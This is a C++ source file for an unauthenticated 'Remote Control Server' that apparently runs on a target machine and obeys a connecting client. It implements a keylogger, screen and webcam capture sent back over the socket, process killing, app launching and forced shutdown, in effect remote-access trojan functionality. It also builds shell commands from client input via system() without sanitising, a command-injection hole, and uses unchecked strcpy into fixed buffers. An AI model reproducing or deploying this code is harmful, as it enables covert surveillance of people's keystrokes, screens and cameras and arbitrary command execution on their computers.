#include "common.h"
#include <atomic>
#include <mutex>

#ifdef _WIN32
    #include <gdiplus.h>
    #include <vfw.h>          // Video for Windows - WEBCAM
    #pragma comment(lib, "gdiplus.lib")
    #pragma comment(lib, "vfw32.lib") // Link VFW library
#else
    #include <X11/Xlib.h>
    #include <X11/Xutil.h>
#endif

class RemoteServer {
private:
    SOCKET_TYPE serverSocket;
    SOCKET_TYPE clientSocket;
    std::atomic<bool> keyloggerActive;
    std::string keylogBuffer;
    std::mutex keylogMutex;
    std::thread keylogThread;
    
    // Webcam state
    std::atomic<bool> webcamActive;
    
public:
    RemoteServer() : serverSocket(INVALID_SOCKET_VALUE), 
                     clientSocket(INVALID_SOCKET_VALUE),
                     keyloggerActive(false),
                     webcamActive(false) {
        initWinsock();
    }
    
    ~RemoteServer() {
        stop();
        cleanupWinsock();
    }
    
    bool start() {
        // Create socket
        serverSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (serverSocket == INVALID_SOCKET_VALUE) {
            std::cerr << "Failed to create socket" << std::endl;
            return false;
        }
        
        // Allow reuse of address
        int opt = 1;
        if (setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, 
                      (char*)&opt, sizeof(opt)) < 0) {
            std::cerr << "Setsockopt failed" << std::endl;
            return false;
        }
        
        // Bind socket
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = INADDR_ANY;
        serverAddr.sin_port = htons(PORT);
        
        if (bind(serverSocket, (struct sockaddr*)&serverAddr, 
                sizeof(serverAddr)) < 0) {
            std::cerr << "Bind failed" << std::endl;
            return false;
        }
        
        // Listen for connections
        if (listen(serverSocket, MAX_CLIENTS) < 0) {
            std::cerr << "Listen failed" << std::endl;
            return false;
        }
        
        std::cout << "Server started on port " << PORT << std::endl;
        std::cout << "Waiting for client connections..." << std::endl;
        
        return true;
    }
    
    void run() {
        while (true) {
            // Accept client connection
            sockaddr_in clientAddr;
            socklen_t clientLen = sizeof(clientAddr);
            
            clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientLen);
            if (clientSocket == INVALID_SOCKET_VALUE) {
                std::cerr << "Accept failed" << std::endl;
                continue;
            }
            
            std::cout << "Client connected from " 
                     << inet_ntoa(clientAddr.sin_addr) << std::endl;
            
            // Handle client commands
            handleClient();
            
            closesocket(clientSocket);
            clientSocket = INVALID_SOCKET_VALUE;
            std::cout << "Client disconnected" << std::endl;
        }
    }
    
    void handleClient() {
        Packet packet;
        
        while (receivePacket(clientSocket, packet)) {
            std::cout << "Received command: " << packet.command << std::endl;
            
            switch (packet.command) {
                case CMD_LIST_APPS:
                    handleListApps();
                    break;
                    
                case CMD_STOP_APP:
                    handleStopApp(packet.data);
                    break;
                    
                case CMD_START_APP:
                    handleStartApp(packet.data);
                    break;
                    
                case CMD_LIST_PROCESS:
                    handleListProcesses();
                    break;
                    
                case CMD_KILL_PROCESS:
                    handleKillProcess(atoi(packet.data));
                    break;
                    
                case CMD_SCREENSHOT:
                    handleScreenshot();
                    break;
                    
                case CMD_KEYLOG_START:
                    startKeylogger();
                    break;
                    
                case CMD_KEYLOG_STOP:
                    stopKeylogger();
                    break;
                    
                case CMD_KEYLOG_GET:
                    getKeylogData();
                    break;
                    
                case CMD_WEBCAM_ON:
                    handleWebcamOn();
                    break;
                    
                case CMD_WEBCAM_OFF:
                    handleWebcamOff();
                    break;
                    
                case CMD_WEBCAM_CAPTURE:
                    handleWebcamCapture(atoi(packet.data));  // N seconds
                    break;
                    
                case CMD_SHUTDOWN:
                    handleShutdown();
                    break;
                    
                case CMD_RESTART:
                    handleRestart();
                    break;
                    
                case CMD_EXIT:
                    return;
                    
                default:
                    std::cout << "Unknown command: " << packet.command << std::endl;
                    break;
            }
        }
    }
    
    // Function 1: List running applications
    void handleListApps() {
        Packet response;
        response.command = CMD_LIST_APPS;
        std::string appList;
        
#ifdef _WIN32
        // Get list of windows
        HWND hwnd = GetTopWindow(NULL);
        while (hwnd) {
            if (IsWindowVisible(hwnd)) {
                char windowTitle[256];
                GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
                if (strlen(windowTitle) > 0) {
                    appList += windowTitle;
                    appList += "\n";
                }
            }
            hwnd = GetNextWindow(hwnd, GW_HWNDNEXT);
        }
#else
        // Linux: List running applications using ps command
        FILE* pipe = popen("ps aux | grep -v grep | awk '{print $11}'", "r");
        if (pipe) {
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe)) {
                appList += buffer;
            }
            pclose(pipe);
        }
#endif
        
        strcpy(response.data, appList.c_str());
        response.dataSize = appList.length();
        sendPacket(clientSocket, response);
    }
    
    // Function 2: Stop an application
    void handleStopApp(const char* appName) {
        Packet response;
        response.command = CMD_STOP_APP;
        std::string result;
        
#ifdef _WIN32
        std::string cmd = "taskkill /F /IM " + std::string(appName) + ".exe";
        int ret = system(cmd.c_str());
        result = (ret == 0) ? "Application stopped successfully" : "Failed to stop application";
#else
        std::string cmd = "pkill -f " + std::string(appName);
        int ret = system(cmd.c_str());
        result = (ret == 0) ? "Application stopped successfully" : "Failed to stop application";
#endif
        
        strcpy(response.data, result.c_str());
        response.dataSize = result.length();
        sendPacket(clientSocket, response);
    }
    
    // Function 3: Start an application
    void handleStartApp(const char* appPath) {
        Packet response;
        response.command = CMD_START_APP;
        std::string result;
        
#ifdef _WIN32
        std::string cmd = "start \"\" \"" + std::string(appPath) + "\"";
        int ret = system(cmd.c_str());
        
        if (ret == 0) {
            result = "Application started successfully";
        } else {
            result = "Failed to start application (check path?)";
        }
#else
        std::string cmd = std::string(appPath) + " &";
        int ret = system(cmd.c_str());
        result = (ret == 0) ? "Application started successfully" : "Failed to start application";
#endif
        
        strcpy(response.data, result.c_str());
        response.dataSize = result.length();
        sendPacket(clientSocket, response);
    }
    
    // Function 4: List processes (Task Manager)
    void handleListProcesses() {
        Packet response;
        response.command = CMD_LIST_PROCESS;
        std::string processList;
        
#ifdef _WIN32
        HANDLE hProcessSnap;
        PROCESSENTRY32 pe32;
        
        hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap == INVALID_HANDLE_VALUE) {
            processList = "Failed to get process list";
        } else {
            pe32.dwSize = sizeof(PROCESSENTRY32);
            
            if (Process32First(hProcessSnap, &pe32)) {
                do {
                    processList += "PID: " + std::to_string(pe32.th32ProcessID);
                    processList += " | Name: " + std::string(pe32.szExeFile);
                    
                    // Get memory usage
                    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 
                                                 FALSE, pe32.th32ProcessID);
                    if (hProcess != NULL) {
                        PROCESS_MEMORY_COUNTERS pmc;
                        if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc))) {
                            processList += " | Memory: " + std::to_string(pmc.WorkingSetSize / 1024 / 1024) + " MB";
                        }
                        CloseHandle(hProcess);
                    }
                    processList += "\n";
                    
                } while (Process32Next(hProcessSnap, &pe32));
            }
            CloseHandle(hProcessSnap);
        }
#else
        FILE* pipe = popen("ps aux", "r");
        if (pipe) {
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe)) {
                processList += buffer;
            }
            pclose(pipe);
        }
#endif
        
        strcpy(response.data, processList.c_str());
        response.dataSize = processList.length();
        sendPacket(clientSocket, response);
    }
    
    // Function 5: Kill a process
    void handleKillProcess(int pid) {
        Packet response;
        response.command = CMD_KILL_PROCESS;
        std::string result;
        
#ifdef _WIN32
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hProcess != NULL) {
            if (TerminateProcess(hProcess, 0)) {
                result = "Process terminated successfully";
            } else {
                result = "Failed to terminate process";
            }
            CloseHandle(hProcess);
        } else {
            result = "Failed to open process";
        }
#else
        if (kill(pid, SIGKILL) == 0) {
            result = "Process terminated successfully";
        } else {
            result = "Failed to terminate process";
        }
#endif
        
        strcpy(response.data, result.c_str());
        response.dataSize = result.length();
        sendPacket(clientSocket, response);
    }
    
    // Function 6: Take screenshot
    void handleScreenshot() {
        Packet response;
        response.command = CMD_SCREENSHOT;
        std::string result_message;
        
#ifdef _WIN32
        // Windows screenshot implementation
        HDC hScreenDC = GetDC(NULL);
        HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
        
        int width = GetDeviceCaps(hScreenDC, HORZRES);
        int height = GetDeviceCaps(hScreenDC, VERTRES);
        
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
        
        BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
        hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);
        
        // Save to file
        std::string filename = "screenshot_" + std::to_string(time(0)) + ".bmp";
        
        BITMAPFILEHEADER bmfHeader;
        BITMAPINFOHEADER bi;
        
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = width;
        bi.biHeight = -height; // top-down
        bi.biPlanes = 1;
        bi.biBitCount = 24;
        bi.biCompression = BI_RGB;
        bi.biSizeImage = 0;
        bi.biXPelsPerMeter = 0;
        bi.biYPelsPerMeter = 0;
        bi.biClrUsed = 0;
        bi.biClrImportant = 0;
        
        DWORD dwBmpSize = ((width * bi.biBitCount + 31) / 32) * 4 * height;
        
        bmfHeader.bfType = 0x4D42;  // 'BM'
        bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
        bmfHeader.bfReserved1 = 0;
        bmfHeader.bfReserved2 = 0;
        bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        
        char* lpbitmap = new char[dwBmpSize];
        GetDIBits(hScreenDC, hBitmap, 0, height, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        
        std::ofstream file(filename, std::ios::binary);
        file.write((char*)&bmfHeader, sizeof(BITMAPFILEHEADER));
        file.write((char*)&bi, sizeof(BITMAPINFOHEADER));
        file.write(lpbitmap, dwBmpSize);
        file.close();
        
        delete[] lpbitmap;
        
        // Clean up GDI objects
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        DeleteObject(hBitmap);

        // Đọc file ảnh và gửi về
        std::ifstream imgFile(filename, std::ios::binary | std::ios::ate);
        if (imgFile.is_open()) {
            std::streamsize fileSize = imgFile.tellg();
            imgFile.seekg(0, std::ios::beg);

            if (fileSize > BUFFER_SIZE) {
                result_message = "Screenshot failed: Image size is too large for buffer.";
                strcpy(response.data, result_message.c_str());
                response.dataSize = result_message.length();
            } else {
                imgFile.read(response.data, fileSize);
                response.dataSize = static_cast<int>(fileSize);
            }
            imgFile.close();
            DeleteFileA(filename.c_str());
        } else {
            result_message = "Screenshot failed: Could not read temp file.";
            strcpy(response.data, result_message.c_str());
            response.dataSize = result_message.length();
        }
#else
        std::string filename = "screenshot_" + std::to_string(time(0)) + ".png";
        std::string cmd = "import -window root " + filename;
        int ret = system(cmd.c_str());
        
        std::string result = (ret == 0) ? 
            "Screenshot saved: " + filename : "Failed to take screenshot";
        
        strcpy(response.data, result.c_str());
        response.dataSize = result.length();
#endif
        
        sendPacket(clientSocket, response);
    }
    
    // Function 7-9: Keylogger functions
    void startKeylogger() {
        if (!keyloggerActive) {
            keyloggerActive = true;
            keylogThread = std::thread(&RemoteServer::keyloggerLoop, this);
            
            Packet response;
            response.command = CMD_KEYLOG_START;
            std::string result = "Keylogger started";
            strcpy(response.data, result.c_str());
            response.dataSize = result.length();
            sendPacket(clientSocket, response);
        }
    }
    
    void stopKeylogger() {
        if (keyloggerActive) {
            keyloggerActive = false;
            if (keylogThread.joinable()) {
                keylogThread.join();
            }
            
            Packet response;
            response.command = CMD_KEYLOG_STOP;
            std::string result = "Keylogger stopped";
            strcpy(response.data, result.c_str());
            response.dataSize = result.length();
            sendPacket(clientSocket, response);
        }
    }
    
    void getKeylogData() {
        Packet response;
        response.command = CMD_KEYLOG_GET;
        
        std::lock_guard<std::mutex> lock(keylogMutex);
        if (keylogBuffer.length() >= BUFFER_SIZE) {
            std::string truncatedData = keylogBuffer.substr(keylogBuffer.length() - (BUFFER_SIZE - 1));
            strcpy(response.data, truncatedData.c_str());
            response.dataSize = truncatedData.length();
        } else {
            strcpy(response.data, keylogBuffer.c_str());
            response.dataSize = keylogBuffer.length();
        }
        keylogBuffer.clear();
        
        sendPacket(clientSocket, response);
    }
    
    void keyloggerLoop() {
#ifdef _WIN32
        while (keyloggerActive) {
            for (int key = 8; key <= 255; key++) {
                if (GetAsyncKeyState(key) & 0x0001) {
                    std::lock_guard<std::mutex> lock(keylogMutex);
                    
                    // Special keys
                    if (key == VK_RETURN) {
                        keylogBuffer += "[ENTER]";
                    } else if (key == VK_SPACE) {
                        keylogBuffer += " ";
                    } else if (key == VK_BACK) {
                        keylogBuffer += "[BACKSPACE]";
                    } else if (key == VK_TAB) {
                        keylogBuffer += "[TAB]";
                    } else if (key == VK_ESCAPE) {
                        keylogBuffer += "[ESC]";
                    } else if (key >= 'A' && key <= 'Z') {
                        keylogBuffer += (char)key;
                    } else if (key >= '0' && key <= '9') {
                        keylogBuffer += (char)key;
                    } else {
                        keylogBuffer += "[" + std::to_string(key) + "]";
                    }
                }
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
#else
        while (keyloggerActive) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
#endif
    }
    
    // ============ WEBCAM FUNCTIONS ============
    
    // Function 10: Turn on webcam (placeholder)
    void handleWebcamOn() {
        Packet response;
        response.command = CMD_WEBCAM_ON;
        webcamActive = true;
        std::string result = "Webcam turned on. Use 'Capture' button to record video.";
        strcpy(response.data, result.c_str());
        response.dataSize = strlen(response.data);
        sendPacket(clientSocket, response);
    }
    
    // Function 11: Turn off webcam
    void handleWebcamOff() {
        Packet response;
        response.command = CMD_WEBCAM_OFF;
        webcamActive = false;
        std::string result = "Webcam turned off";
        strcpy(response.data, result.c_str());
        response.dataSize = result.length();
        sendPacket(clientSocket, response);
    }
    
// Function 14: Capture webcam - CHỤP ẢNH TỪ WEBCAM (không cần FFmpeg)
    void handleWebcamCapture(const char* data) {
        Packet response;
        response.command = CMD_WEBCAM_CAPTURE;
        
        // Parse số ảnh từ data (mặc định = 1 nếu không parse được)
        int numPhotos = 1;
        if (data != nullptr && strlen(data) > 0) {
            numPhotos = atoi(data);
        }
        
        std::cout << "[Server] Webcam capture requested, data: '" << (data ? data : "null") << "', numPhotos: " << numPhotos << std::endl;
        
        // Nếu numPhotos không hợp lệ, dùng mặc định là 1
        if (numPhotos <= 0 || numPhotos > 10) {
            numPhotos = 1;
        }
        
        std::cout << "[Server] Capturing " << numPhotos << " photo(s) from webcam..." << std::endl;
        
#ifdef _WIN32
        // ===== DÙNG VFW (Video for Windows) API - KHÔNG CẦN CÀI GÌ THÊM =====
        
        // Tìm webcam driver
        HWND hWndCap = capCreateCaptureWindowA(
            "WebcamCapture",        // Window name
            WS_CHILD | WS_VISIBLE,  // Window style
            0, 0, 640, 480,         // Position and size
            GetDesktopWindow(),     // Parent window
            0                       // ID
        );
        
        if (!hWndCap) {
            std::string result = "Failed to create capture window. Webcam may not be available.";
            strcpy(response.data, result.c_str());
            response.dataSize = result.length();
            sendPacket(clientSocket, response);
            return;
        }
        
        // Kết nối đến webcam (driver 0)
        bool connected = false;
        for (int i = 0; i < 10; i++) {
            if (capDriverConnect(hWndCap, i)) {
                connected = true;
                std::cout << "[Server] Connected to webcam driver " << i << std::endl;
                break;
            }
        }
        
        if (!connected) {
            DestroyWindow(hWndCap);
            std::string result = "Failed to connect to webcam. Please check:\n"
                                "1. Webcam is connected\n"
                                "2. Webcam is not being used by another app\n"
                                "3. Webcam drivers are installed";
            strcpy(response.data, result.c_str());
            response.dataSize = result.length();
            sendPacket(clientSocket, response);
            return;
        }
        
        // Chụp ảnh
        std::string filename = "webcam_capture_" + std::to_string(time(0)) + ".bmp";
        
        // Grab frame và save
        capGrabFrame(hWndCap);
        capFileSaveDIB(hWndCap, filename.c_str());
        
        // Ngắt kết nối webcam
        capDriverDisconnect(hWndCap);
        DestroyWindow(hWndCap);
        
        // Đọc file ảnh và gửi về
        std::ifstream imgFile(filename, std::ios::binary | std::ios::ate);
        if (imgFile.is_open()) {
            std::streamsize fileSize = imgFile.tellg();
            imgFile.seekg(0, std::ios::beg);
            
            std::cout << "[Server] Webcam photo captured: " << fileSize << " bytes" << std::endl;
            
            if (fileSize > BUFFER_SIZE) {
                std::string result = "Image too large for buffer.";
                strcpy(response.data, result.c_str());
                response.dataSize = result.length();
            } else if (fileSize > 0) {
                imgFile.read(response.data, fileSize);
                response.dataSize = static_cast<int>(fileSize);
            } else {
                std::string result = "Captured image is empty. Webcam may not be working properly.";
                strcpy(response.data, result.c_str());
                response.dataSize = result.length();
            }
            imgFile.close();
            DeleteFileA(filename.c_str());
        } else {
            std::string result = "Failed to capture webcam photo.";
            strcpy(response.data, result.c_str());
            response.dataSize = result.length();
        }
        
#else
        // Linux: Dùng fswebcam hoặc v4l2
        std::string filename = "webcam_capture_" + std::to_string(time(0)) + ".jpg";
        std::string cmd = "fswebcam -r 640x480 --no-banner " + filename + " 2>/dev/null";
        int ret = system(cmd.c_str());
        
        if (ret != 0) {
            // Thử với v4l2
            cmd = "v4l2-ctl --device=/dev/video0 --stream-mmap --stream-count=1 --stream-to=" + filename;
            ret = system(cmd.c_str());
        }
        
        std::ifstream imgFile(filename, std::ios::binary | std::ios::ate);
        if (imgFile.is_open()) {
            std::streamsize fileSize = imgFile.tellg();
            imgFile.seekg(0, std::ios::beg);
            
            if (fileSize > 0 && fileSize <= BUFFER_SIZE) {
                imgFile.read(response.data, fileSize);
                response.dataSize = static_cast<int>(fileSize);
            }
            imgFile.close();
            remove(filename.c_str());
        } else {
            std::string result = "Failed to capture. Install fswebcam: sudo apt install fswebcam";
            strcpy(response.data, result.c_str());
            response.dataSize = result.length();
        }
#endif
        
        sendPacket(clientSocket, response);
    }
    
    // Function 12-13: System control
    void handleShutdown() {
        Packet response;
        response.command = CMD_SHUTDOWN;
        std::string result = "System shutting down...";
        
        strcpy(response.data, result.c_str());
        response.dataSize = result.length();
        sendPacket(clientSocket, response);
        
#ifdef _WIN32
        system("shutdown /s /t 10");
#else
        system("shutdown -h now");
#endif
    }
    
    void handleRestart() {
        Packet response;
        response.command = CMD_RESTART;
        std::string result = "System restarting...";
        
        strcpy(response.data, result.c_str());
        response.dataSize = result.length();
        sendPacket(clientSocket, response);
        
#ifdef _WIN32
        system("shutdown /r /t 10");
#else
        system("reboot");
#endif
    }
    
    void stop() {
        if (keyloggerActive) {
            stopKeylogger();
        }
        
        if (clientSocket != INVALID_SOCKET_VALUE) {
            closesocket(clientSocket);
        }
        
        if (serverSocket != INVALID_SOCKET_VALUE) {
            closesocket(serverSocket);
        }
    }
};

int main() {
    std::cout << "==================================" << std::endl;
    std::cout << "   Remote Control Server v2.0    " << std::endl;
    std::cout << "   (with Webcam Support)         " << std::endl;
    std::cout << "==================================" << std::endl;
    
    RemoteServer server;
    
    if (!server.start()) {
        std::cerr << "Failed to start server!" << std::endl;
        return 1;
    }
    
    try {
        server.run();
    } catch (const std::exception& e) {
        std::cerr << "Server error: " << e.what() << std::endl;
    }
    
    return 0;
}